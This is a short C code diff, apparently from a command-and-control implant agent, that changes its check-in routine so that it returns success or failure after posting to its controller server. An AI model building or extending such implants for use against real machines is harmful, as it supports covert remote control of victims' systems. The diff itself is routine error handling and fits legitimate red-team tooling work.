@@ -77,7 +77,7 @@ void free_checkin_reply(CheckinReply *reply) {
 	if (reply->status != NULL) { KERNEL32$VirtualFree(reply->status, 0, MEM_RELEASE); }
 }
 
-void perform_checkin(AgentState *state, AgentCapabilities *cap, CheckinReply *reply) {
+BOOL perform_checkin(AgentState *state, AgentCapabilities *cap, CheckinReply *reply) {
 	// Generate checkin payload.
 	CheckinRequest checkin = { 0 };
 	checkin.payload_uuid = clone_str(state->params.payload_uuid);
@@ -91,11 +91,13 @@ void perform_checkin(AgentState *state, AgentCapabilities *cap, CheckinReply *re
 	HttpBody body = {msg, MSVCRT$strlen(msg)};
 	HttpResponse response = {0};
 	
-	HttpRequest(state->http, HTTP_METHOD_POST, &uri, NULL, &body, &response);
+	BOOL result = HttpRequest(state->http, HTTP_METHOD_POST, &uri, NULL, &body, &response);
 	
 	// If we get a 200 response code, parse the reply.
-	if (response.status_code == 200) {
+	if (result == TRUE && response.status_code == 200) {
 		parse_checkin_reply(&response, reply);
+	} else {
+		result = FALSE;
 	}
 	
 	// Free unneeded allocations.
@@ -103,6 +105,8 @@ void perform_checkin(AgentState *state, AgentCapabilities *cap, CheckinReply *re
 	KERNEL32$VirtualFree(msg, 0, MEM_RELEASE);
 	MSVCRT$free(response.body);
 	MSVCRT$free(response.content_type);
+	
+	return result;
 }
 
 /*
